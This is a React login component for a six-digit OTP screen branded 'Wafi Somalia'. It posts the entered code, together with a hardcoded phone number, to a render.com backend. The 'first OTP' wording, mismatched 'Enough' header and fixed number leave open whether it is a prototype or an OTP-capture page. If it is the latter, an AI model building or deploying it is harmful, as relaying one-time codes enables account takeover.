import React, { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";

export default function Authentication() {
  const navigate = useNavigate();

  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [seconds, setSeconds] = useState(32);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const inputsRef = useRef([]);

  useEffect(() => {
    if (seconds <= 0) return;
    const t = setTimeout(() => setSeconds((s) => s - 1), 1000);
    return () => clearTimeout(t);
  }, [seconds]);

  const handleChange = (index, value) => {
    if (!/^\d?$/.test(value)) return;

    const next = [...otp];
    next[index] = value;
    setOtp(next);

    if (value && index < 5) {
      inputsRef.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputsRef.current[index - 1]?.focus();
    }
  };

  const isComplete = otp.every((d) => d !== "");

  const handleVerify = async () => {
    setError("");

    if (!isComplete) return;

    const fullOtp = otp.join("");

    try {
      setLoading(true);

      const response = await fetch(
        "https://wafi-wex0.onrender.com//api/auth/verify-otp",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            phone: "+252072605064",
            otp: fullOtp,
          }),
        }
      );

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.message || "OTP verification failed");
      }

      console.log("OTP SUCCESS:", data);

      navigate("/success");
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col font-sans">
      {/* Header */}
      <div className="flex items-center justify-between px-4 py-4 border-b border-gray-100">
        <h1 className="text-3xl" style={{ color: "#57b129" }}>
          Enough
        </h1>
      </div>

      {/* Content */}
      <div className="flex-1 px-4 pt-10 pb-8">
        <div className="bg-white rounded-2xl shadow-lg border border-gray-100 p-6 max-w-md mx-auto">

          <h2 className="text-center text-2xl mb-4">
            First OTP Verification
          </h2>

          <p className="text-center text-gray-800 text-sm mb-6">
            +252072605064
          </p>

          {/* Error */}
          {error && (
            <p className="text-red-500 text-sm text-center mb-4">
              {error}
            </p>
          )}

          {/* OTP */}
          <div className="flex justify-center gap-2.5 mb-4">
            {otp.map((digit, i) => (
              <input
                key={i}
                ref={(el) => (inputsRef.current[i] = el)}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(i, e.target.value)}
                onKeyDown={(e) => handleKeyDown(i, e)}
                className="w-12 h-14 text-center text-lg rounded-xl border-2 border-green-500 focus:outline-none"
              />
            ))}
          </div>

          {/* Timer */}
          <p className="text-center text-gray-400 text-sm mb-8">
            {seconds > 0
              ? `Resend code in ${seconds}s`
              : "Resend code now"}
          </p>

          {/* Submit button */}
          <button
            onClick={handleVerify}
            disabled={!isComplete || loading}
            className={`w-full text-sm tracking-wide py-4 rounded-xl ${
              isComplete && !loading
                ? "text-white"
                : "bg-gray-200 text-gray-400 cursor-not-allowed"
            }`}
            style={
              isComplete && !loading
                ? { background: "linear-gradient(to right, #a3dd3f, #57b129)" }
                : {}
            }
          >
            {loading ? "Verifying..." : "VERIFY THE FIRST OTP"}
          </button>
        </div>
      </div>

      {/* Footer */}
      <div
        className="rounded-t-[48px] text-center py-8 px-6 mt-auto"
        style={{ background: "linear-gradient(to right, #a3dd3f, #57b129)" }}
      >
        <p className="text-white text-sm">© 2026 Wafi Somalia</p>
      </div>
    </div>
  );
}